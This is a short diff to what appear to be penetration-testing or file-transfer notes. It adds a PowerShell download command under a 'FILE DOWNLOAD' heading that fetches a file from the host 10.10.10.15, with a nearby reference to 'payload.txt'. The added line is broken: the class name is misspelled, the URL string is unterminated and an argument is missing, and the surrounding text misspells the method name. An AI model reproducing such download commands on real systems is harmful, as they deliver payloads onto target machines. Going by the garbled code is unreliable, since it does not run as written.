@@ -27,5 +27,5 @@ md5sum payload.txt
 Class name `Net.WebClient` and the `DownlaodFile` method 
 - FILE DOWNLOAD 
 ```powershell
-
+(New-Object New.WebClient).DownloadFile('http://10.10.10.15:)
 ```
